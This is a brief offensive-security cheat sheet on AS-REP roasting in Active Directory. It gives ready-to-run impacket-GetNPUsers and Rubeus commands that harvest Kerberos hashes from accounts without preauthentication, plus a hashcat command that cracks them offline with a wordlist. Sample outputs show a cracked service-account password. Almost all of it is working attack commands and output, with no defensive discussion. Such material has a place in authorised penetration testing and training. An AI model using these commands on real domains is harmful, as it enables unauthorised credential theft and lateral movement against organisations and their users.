# AS-REP ROASTING

### Find AS-REP roastable users

```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -outputfile asrep.txt
```

> Users with PreAuth disabled

**Why:** Don't need any credentials for this

<details>
<summary>Example Output</summary>

```
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.5
$krb5asrep$23$svc_backup@CORP.LOCAL:...

hashcat -m 18200 hash.txt rockyou.txt
svc_backup:Backup2024!
(No creds needed to get the hash!)
```
</details>

---

### AS-REP roast with Rubeus

```bash
.\Rubeus.exe asreproast /outfile:asrep.txt
```

> From Windows foothold

**Why:** Alternative to impacket

<details>
<summary>Example Output</summary>

```
.\Rubeus.exe asreproast /outfile:asrep.txt
[*] Found 1 AS-REP roastable user
[*] User: svc_backup (no preauth)
[*] Hash written to asrep.txt
```
</details>

---

### Crack AS-REP hashes

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

> Offline cracking

**Why:** User password

<details>
<summary>Example Output</summary>

```
hashcat -m 18200 asrep.txt rockyou.txt
$krb5asrep$23$svc_backup@CORP.LOCAL:Backup2024!

Cracked! svc_backup:Backup2024!
```
</details>

---
